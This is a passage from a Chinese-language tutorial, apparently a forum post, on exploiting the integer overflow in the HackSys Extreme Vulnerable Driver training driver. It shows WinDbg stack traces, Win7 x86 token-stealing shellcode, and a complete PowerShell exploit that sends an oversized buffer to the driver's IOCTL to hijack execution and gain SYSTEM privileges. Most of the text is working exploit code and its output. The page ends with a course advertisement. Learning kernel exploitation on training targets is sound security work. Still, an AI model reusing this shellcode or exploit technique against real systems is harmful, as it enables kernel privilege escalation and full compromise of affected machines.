
```
kd> bp 9528c9b4

kd> g

****** HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW ******

[+] UserBuffer: 0x023CAAEC

[+] UserBuffer Size: 0x108

[+] KernelBuffer: 0xA46B72AC

[+] KernelBuffer Size: 0x800

[+] Triggering Integer Overflow

Breakpoint 0 hit

HackSysExtremeVulnerableDriver+0x49b4:

9528c9b4 c20800     ret     8     <-------[Stack]  a46b7ad4 9528c9da HackSysExtremeVulnerableDriver+0x49da

                                                   a46b7ad8 023cabf0 

                                                   a46b7adc 00000108 

                                                   a46b7ae0 a46b7afc 

                                                   a46b7ae4 9528d0e6 HackSysExtremeVulnerableDriver+0x50e6

HackSysExtremeVulnerableDriver+0x49da:

9528c9da 5d         pop     ebp   <-------[Stack]  a46b7ae0 a46b7afc 

                                                   a46b7ae4 9528d0e6 HackSysExtremeVulnerableDriver+0x50e6

                                                   a46b7ae8 85edde80

HackSysExtremeVulnerableDriver+0x49db:

9528c9db c20800     ret     8     <-------[Stack]  a46b7ae4 9528d0e6 HackSysExtremeVulnerableDriver+0x50e6

                                                   a46b7ae8 85edde80 

                                                   a46b7aec 85eddef0 

                                                   a46b7af0 85396620 



****** HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW ******

[+] UserBuffer: 0x0234FAA4

[+] UserBuffer Size: 0xFFFFFFFF

[+] KernelBuffer: 0x96F4F2AC

[+] KernelBuffer Size: 0x800

[+] Triggering Integer Overflow

Breakpoint 0 hit

HackSysExtremeVulnerableDriver+0x49b4:

9528c9b4 c20800     ret     8     <-------[Stack]  96f4fad4 42424242 

                                                   96f4fad8 023502d0 

                                                   96f4fadc ffffffff 

                                                   96f4fae0 96f4fafc 

                                                   96f4fae4 9528d0e6 HackSysExtremeVulnerableDriver+0x50e6

```

看起来和第十部分处理的栈溢出完全一致。检查一下触发整数溢出时的栈。

我们可以修改shellcode的结尾，保存丢失的指令。

```
$Shellcode = [Byte[]] @(

    #---[Setup]

    0x60,                               # pushad

    0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]

    0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]

    0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)

    0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]

    #---[Copy System PID token]

    0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)

    0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] <-|

    0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |

    0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |

    0x75, 0xED,                         # jnz                           ->|

    0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]

    0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx

    #---[Recover]

    0x61,                               # popad

    0x31, 0xC0,                         # NTSTATUS -> STATUS_SUCCESS :p

    0x5D,                               # pop ebp

    0xC2, 0x08, 0x00                    # ret 8

)

```

## 大功告成

请参考下面的完整exp获取更多信息。

```
Add-Type -TypeDefinition @"

using System;

using System.Diagnostics;

using System.Runtime.InteropServices;

using System.Security.Principal;



public static class EVD

{

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]

    public static extern IntPtr CreateFile(

        String lpFileName,

        UInt32 dwDesiredAccess,

        UInt32 dwShareMode,

        IntPtr lpSecurityAttributes,

        UInt32 dwCreationDisposition,

        UInt32 dwFlagsAndAttributes,

        IntPtr hTemplateFile);  



    [DllImport("Kernel32.dll", SetLastError = true)]

    public static extern bool DeviceIoControl(

        IntPtr hDevice,

        int IoControlCode,

        byte[] InBuffer,

        int nInBufferSize,

        byte[] OutBuffer,

        int nOutBufferSize,

        ref int pBytesReturned,

        IntPtr Overlapped);



    [DllImport("kernel32.dll", SetLastError = true)]

    public static extern IntPtr VirtualAlloc(

        IntPtr lpAddress,

        uint dwSize,

        UInt32 flAllocationType,

        UInt32 flProtect);

}

"@



# Compiled with Keystone-Engine

# Hardcoded offsets for Win7 x86 SP1

$Shellcode = [Byte[]] @(

    #---[Setup]

    0x60,                               # pushad

    0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]

    0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]

    0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)

    0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]

    #---[Copy System PID token]

    0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)

    0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] <-|

    0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |

    0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |

    0x75, 0xED,                         # jnz                           ->|

    0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]

    0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx

    #---[Recover]

    0x61,                               # popad

    0x31, 0xC0,                         # NTSTATUS -> STATUS_SUCCESS :p

    0x5D,                               # pop ebp

    0xC2, 0x08, 0x00                    # ret 8

)



# Write shellcode to memory

echo "`n[>] Allocating ring0 payload.."

[IntPtr]$Pointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Pointer, $Shellcode.Length)

$EIP = [System.BitConverter]::GetBytes($Pointer.ToInt32())

echo "[+] Payload size: $($Shellcode.Length)"

echo "[+] Payload address: $("{0:X8}" -f $Pointer.ToInt32())"



$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)



if ($hDevice -eq -1) {

    echo "`n[!] Unable to get driver handle..`n"

    Return

} else {

    echo "`n[>] Driver information.."

    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"

    echo "[+] Handle: $hDevice"

}



$Buffer = [Byte[]](0x41)*0x828 + $EIP + [System.BitConverter]::GetBytes(0xbad0b0b0)

$Size = 0xffffffff

echo "`n[>] Sending buffer.."

echo "[+] Buffer size: $($Buffer.Length)"

echo "[+] Fake buffer size: $("{0:X}" -f $Size)"

echo "[+] IOCTL: 0x222027`n"

[EVD]::DeviceIoControl($hDevice, 0x222027, $Buffer, $Size, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null

```

![](https://bbs.kanxue.com/upload/attach/201803/530966_TGYR4TAQUZ6257X.jpg)

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于  2018-3-15 20:24

被玉涵编辑

，原因：
